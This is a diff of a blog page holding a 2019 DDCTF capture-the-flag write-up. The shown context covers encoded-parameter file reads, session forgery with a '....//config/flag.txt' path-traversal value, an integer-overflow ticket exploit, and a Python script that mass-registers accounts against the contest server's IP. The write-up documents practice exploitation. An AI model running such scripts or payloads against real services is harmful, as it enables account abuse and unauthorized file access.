@@ -8,13 +8,13 @@
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
   <title>2019 DDCTF — 线上赛WriteUp | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来 Python的Flask简单学习：https://blog.csdn.net/luanpeng825485697/article/details/80934185  参考文章 https://xz.aliyun.com/t/4862 https://www.ctfwp.c">
+  <meta name="description" content="前言首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来 Python的Flask简单学习：https://blog.csdn.net/luanpeng825485697/article/details/80934185 参考文章 https://xz.aliyun.com/t/4862 https://www.ctfwp.co">
 <meta name="keywords" content="CTF比赛">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2019 DDCTF — 线上赛WriteUp">
 <meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/04/18/CTF比赛—2019DDCTF线上赛WriteUp/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="前言首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来 Python的Flask简单学习：https://blog.csdn.net/luanpeng825485697/article/details/80934185  参考文章 https://xz.aliyun.com/t/4862 https://www.ctfwp.c">
+<meta property="og:description" content="前言首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来 Python的Flask简单学习：https://blog.csdn.net/luanpeng825485697/article/details/80934185 参考文章 https://xz.aliyun.com/t/4862 https://www.ctfwp.co">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-1.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-2.png">
@@ -70,10 +70,10 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-7.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-8.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-9.png">
-<meta property="og:updated_time" content="2019-04-24T16:38:23.904Z">
+<meta property="og:updated_time" content="2019-07-26T05:33:35.507Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2019 DDCTF — 线上赛WriteUp">
-<meta name="twitter:description" content="前言首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来 Python的Flask简单学习：https://blog.csdn.net/luanpeng825485697/article/details/80934185  参考文章 https://xz.aliyun.com/t/4862 https://www.ctfwp.c">
+<meta name="twitter:description" content="前言首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来 Python的Flask简单学习：https://blog.csdn.net/luanpeng825485697/article/details/80934185 参考文章 https://xz.aliyun.com/t/4862 https://www.ctfwp.co">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-1.png">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
@@ -214,18 +214,13 @@
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先，本文的涉及到的思路、知识点是实验室成员们共同努力的成果。借鉴学习，我再将比赛中的题目按照自己学到的再做一次，记录下来</p>
 <p>Python的Flask简单学习：<a href="https://blog.csdn.net/luanpeng825485697/article/details/80934185" target="_blank" rel="noopener">https://blog.csdn.net/luanpeng825485697/article/details/80934185</a></p>
-<hr>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
 <li><a href="https://xz.aliyun.com/t/4862" target="_blank" rel="noopener">https://xz.aliyun.com/t/4862</a></li>
 <li><a href="https://www.ctfwp.com/articals/2019ddctf.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019ddctf.html?tdsourcetag=s_pctim_aiomsg</a></li>
 <li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></li>
 <li><a href="https://xz.aliyun.com/t/4849" target="_blank" rel="noopener">https://xz.aliyun.com/t/4849</a></li>
 </ol>
-<hr>
-<ol>
-<li>Web</li>
-</ol>
-<h2 id="第一题（滴-）"><a href="#第一题（滴-）" class="headerlink" title="第一题（滴~）"></a>第一题（滴~）</h2><p>链接进去后，看到<code>jpg</code>参数值后面接着一串<code>Base64</code>密文</p>
+<h1 id="1-Web"><a href="#1-Web" class="headerlink" title="1. Web"></a>1. Web</h1><h2 id="第一题（滴-）"><a href="#第一题（滴-）" class="headerlink" title="第一题（滴~）"></a>第一题（滴~）</h2><p>链接进去后，看到<code>jpg</code>参数值后面接着一串<code>Base64</code>密文</p>
 <p>解密过程：<code>两次Base64解密，一次Hex转ASCII</code>，解出：<code>flag.jpg</code></p>
 <p>flag.jpg正是页面返回的内容之一</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-1.png" alt="1-1"></p>
@@ -254,7 +249,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.51.150.246/f1ag!ddctf.php?uid=</span><br></pre></td></tr></table></figure>
 <p>直接拿到flag</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/1-10.png" alt="1-10"></p>
-<hr>
 <h2 id="第二题（WEB签到题）"><a href="#第二题（WEB签到题）" class="headerlink" title="第二题（WEB签到题）"></a>第二题（WEB签到题）</h2><p>访问链接，提示<code>抱歉，您没有登陆权限，请获取权限后访问-----</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-1.png" alt="2-1"></p>
 <p>查看源代码，关注到：<code>js/index.js</code></p>
@@ -313,7 +307,6 @@
 <p>生成一个使用Session类、给path赋值<strong>….//config/flag.txt</strong>，然后按照生成方法得到ddctf_id，最后url编码</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-19.png" alt="2-19"></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/2-20.png" alt="2-20"></p>
-<hr>
 <h2 id="第三题（Upload-IMG）"><a href="#第三题（Upload-IMG）" class="headerlink" title="第三题（Upload-IMG）"></a>第三题（Upload-IMG）</h2><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><ol>
 <li><p><a href="https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg" target="_blank" rel="noopener">https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg</a></p>
 </li>
@@ -416,7 +409,6 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re,time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">R_success = R_fail = <span class="number">0</span>	<span class="comment">#注册成功（失败）计数</span></span><br><span class="line">B_success = B_fail = <span class="number">0</span>	<span class="comment">#买票成功（失败）计数</span></span><br><span class="line">P_success = P_fail = <span class="number">0</span>	<span class="comment">#支付票成功（失败）计数</span></span><br><span class="line">List_of_id = []			<span class="comment">#存放id的数组</span></span><br><span class="line">List_of_ticket = []		<span class="comment">#存放ticket的数组</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">'123456789'</span></span><br><span class="line">ticket_price = <span class="number">4294967296</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">110</span>):</span><br><span class="line">	name = <span class="string">'hsuser'</span>+str(i)</span><br><span class="line">	url1 = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=%s&amp;password=%s"</span>%(name,password)</span><br><span class="line">	r1 = s.get(url1)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'"code":200'</span> <span class="keyword">in</span> r1.text:		<span class="comment">#注册成功后</span></span><br><span class="line">		R_success += <span class="number">1</span></span><br><span class="line">		url2 = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=%d"</span>%(ticket_price)</span><br><span class="line">		r2 = s.get(url2)</span><br><span class="line">		<span class="comment">#r2.text = &#123;"code":200,"data":[&#123;"bill_id":"2e35623d-bbeb-44b1-9ee9-77ee3ffd291f","ticket_price":4294967296&#125;]&#125;</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">'"code":200'</span> <span class="keyword">in</span> r2.text:		<span class="comment">#买票成功后</span></span><br><span class="line">			B_success += <span class="number">1</span></span><br><span class="line">			bill_id = re.findall(<span class="string">r'"bill_id":"(.*)",'</span>,r2.text)[<span class="number">0</span>]</span><br><span class="line">			url3 = <span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span>%(bill_id)</span><br><span class="line">			r3 = s.get(url3)</span><br><span class="line">			<span class="comment">#r3.text = &#123;"code":200,"data":[&#123;"your_id":144,"your_ticket":"b017ec750d8b04d1db6cb8bafec4dccb"&#125;]&#125;</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">'"code":200'</span> <span class="keyword">in</span> r3.text:		<span class="comment">#支付票成功后</span></span><br><span class="line">				P_success += <span class="number">1</span></span><br><span class="line">				your_id = re.findall(<span class="string">r'"your_id":(.*),"you'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">				your_ticket = re.findall(<span class="string">r'"your_ticket":"(.*)"&#125;]'</span>,r3.text)[<span class="number">0</span>]</span><br><span class="line">				List_of_id.append(your_id)</span><br><span class="line">				List_of_ticket.append(your_ticket)</span><br><span class="line">				time.sleep(<span class="number">0.5</span>)		<span class="comment">#引入时间函数是为了停顿，因为太快的话服务器好像会反映不过来</span></span><br><span class="line">				print(<span class="string">"完成第"</span>+str(i)+<span class="string">"位"</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				P_fail += <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			B_fail += <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		R_fail += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">url4 = <span class="string">"http://117.51.147.155:5050/ctf/api/login?name=hhuser2&amp;password=123456789"</span></span><br><span class="line">r4 = s.get(url4)	<span class="comment">#获得我们"鸡王"的登录Session状态</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):		<span class="comment">#从列表中一个个取出id和ticket，杀掉它们</span></span><br><span class="line">	url5 = <span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span>%(List_of_id[i],List_of_ticket[i])</span><br><span class="line">	r5 = s.get(url5)</span><br><span class="line">	print(r5.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#以下是对注册、买票、支付票成功与否的一个统计数据，可以做参考</span></span><br><span class="line">print(<span class="string">"Register success:"</span> + str(R_success))</span><br><span class="line">print(<span class="string">"Register fali:"</span> + str(R_fail))</span><br><span class="line">print(<span class="string">"========================"</span>)</span><br><span class="line">print(<span class="string">"Buy ticket success:"</span> + str(B_success))</span><br><span class="line">print(<span class="string">"Buy ticket fali:"</span> + str(B_fail))</span><br><span class="line">print(<span class="string">"========================"</span>)</span><br><span class="line">print(<span class="string">"Puy ticket success:"</span> + str(P_success))</span><br><span class="line">print(<span class="string">"Puy ticket fali:"</span> + str(P_fail))</span><br><span class="line">print(<span class="string">"========================"</span>)</span><br></pre></td></tr></table></figure>
 <p>实际操作的时候，因为各种原因，要<code>多次提交脚本</code>最终才能让我们的<code>鸡王</code>干掉100个对手，得到flag：</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019DDCTF/Web/6-9.png" alt="6-9"></p>
-<hr>
 <h1 id="2-Misc"><a href="#2-Misc" class="headerlink" title="2. Misc"></a>2. Misc</h1><h2 id="第一题（北京地铁）"><a href="#第一题（北京地铁）" class="headerlink" title="第一题（北京地铁）"></a>第一题（北京地铁）</h2><h2 id="第二题（MulTzor）"><a href="#第二题（MulTzor）" class="headerlink" title="第二题（MulTzor）"></a>第二题（MulTzor）</h2><h2 id="第四题（Wireshark）"><a href="#第四题（Wireshark）" class="headerlink" title="第四题（Wireshark）"></a>第四题（Wireshark）</h2><p><code>tcp.stream eq 1</code></p>
 <p>分析第一段TCP流，发现访问了这个网址：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a></p>
 <p><img src alt="1-1"></p>
@@ -447,8 +439,7 @@
 <p>将中间那段16进制转ASCII，解出flag</p>
 <p><img src alt="1-9"></p>
 <p><code>DDCTF{NbuiBUlR5lhww2OfpEmueZd64OlRJ1D2}</code></p>
-<h2 id="第五题（联盟决策大会）"><a href="#第五题（联盟决策大会）" class="headerlink" title="第五题（联盟决策大会）"></a>第五题（联盟决策大会）</h2><hr>
-
+<h2 id="第五题（联盟决策大会）"><a href="#第五题（联盟决策大会）" class="headerlink" title="第五题（联盟决策大会）"></a>第五题（联盟决策大会）</h2>
       
 
       
@@ -531,11 +522,11 @@
   
 <nav id="article-nav">
   
-    <a href="/Knlvre.github-io/2019/05/02/BugKuCTF—杂项题 第31-40关/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/Knlvre.github-io/2019/04/18/CTF比赛—2019ISCC线下赛WriteUp/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          BugKuCTF — 杂项题(第31-40关)
+          2019 DDCTF — 线上赛WriteUp
         
       </div>
     </a>
